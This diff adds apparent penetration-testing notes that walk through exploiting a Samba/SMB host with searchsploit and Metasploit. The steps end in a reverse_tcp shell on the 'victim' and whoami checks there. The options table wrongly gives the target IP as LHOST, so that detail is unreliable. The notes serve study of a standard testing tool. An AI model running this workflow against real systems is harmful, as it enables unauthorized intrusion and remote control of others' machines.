@@ -1,0 +1,47 @@
+##################################
+#####AUTOMATED SMB ATTACK###############
+#############VIA METASPLOIT#####################
+##################################
+
+cmds ex:
+    #searchsploit  samba 2.2
+        (be as precise as possible while using searchsploit)
+    
+(lunch mestasploit with the result of searchsploit)
+    #msfconsole
+    msf5> search resultOfSearchsploit
+    msf5> use moduleNumber
+    msf5> options 
+    msf5> set RHOSTS targetIP
+
+(check if the SET RHOSTS has been set properly)
+    msf5> options
+        display this: 
+        
+        Payload options (osName/osPayloadVersion/meterpreter/reverse_tcp) (Staged payload):
+
+        Name   Current Setting  Required  Description
+        ----   ---------------  --------  -----------
+        LHOST  (Target IP)     yes       The listen address (an interface may be specified)
+        LPORT  4444             yes       The listen port
+    
+    msf5> show targets
+
+(IF its OK, then start the Exploit via):
+    msf5> exploit
+
+    if exploit == false:
+        try to change the PAYLOADS type(Non-Staged or Staged)
+        use msf5> options
+        msf5>set payload payloadName(Choose another payload)
+
+        check again with:
+        msf5> options (It will dispay  "Payload options (os/osPayloadVersion/shell_reverse_tcp)": Non-Staged)
+
+
+        msf5>run
+    elif exploit:
+        msf5>run display:  
+        "Command shell session 5 opened (AttackerIP:4444 -> VictimIP:opened Port) at 2023-04-03 12:10:01 -0400"
+
+        You are on the victim's shell try to enter (whoami, hostname)
